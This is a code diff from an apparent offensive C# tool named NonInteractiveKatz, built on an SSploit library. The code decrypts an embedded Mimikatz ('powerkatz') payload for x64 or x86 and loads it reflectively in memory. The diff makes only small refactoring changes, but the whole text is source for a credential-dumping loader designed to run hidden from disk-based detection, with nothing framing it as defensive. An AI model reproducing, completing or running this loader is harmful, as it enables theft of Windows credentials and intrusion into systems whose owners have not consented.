@@ -4,11 +4,13 @@ using System.Threading;
 using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 
-using SSploit.Misc;
+//using SSploit.Misc;
 using SSploit.Execution;
 using PInvoke = SSploit.Execution.PlatformInvoke;
 using System.IO;
 using System.IO.Compression;
+using System.Reflection;
+using System.Runtime.InteropServices.ComTypes;
 
 namespace NonInteractiveKatz
 {
@@ -35,14 +37,14 @@ namespace NonInteractiveKatz
                 {
                     //x64 Unpack And Execute
                     Console.WriteLine("x64 !! Gocha");
-                    PEBytes64 = Utilities.Decrypt(NonInteractiveMimikatz.Properties.Resources.x64powerkatz);
+                    PEBytes64 = Utilities.Decrypt(Properties.Resources.x64powerkatz);
                     MimikatzPE = PE.Load(PEBytes64);
                 }
                 else if (IntPtr.Size == 4)
                 {
                     //x86 Unpack And Execute
                     Console.WriteLine("x86 !! Gocha");
-                    PEBytes32 = Utilities.Decrypt(NonInteractiveMimikatz.Properties.Resources.Win32powerkatz);
+                    PEBytes32 = Utilities.Decrypt(Properties.Resources.Win32powerkatz);
                     MimikatzPE = PE.Load(PEBytes32);
                 }
                 
